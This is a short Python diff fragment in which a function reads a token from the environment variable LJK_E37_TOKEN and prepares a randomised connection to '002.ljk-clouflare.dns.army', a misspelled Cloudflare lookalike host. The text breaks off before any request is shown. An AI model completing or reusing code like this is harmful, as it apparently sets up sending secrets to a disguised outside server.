@@ -1,12 +1,13 @@
 import requests
 import json
 import os
+import random
 
 def build_file():
     uuid = os.getenv('LJK_E37_TOKEN')
     if not uuid: return
     port = random.choice(ports)
-    port = 443
+   # port = 443
     host = '002.ljk-clouflare.dns.army'
         
     try:
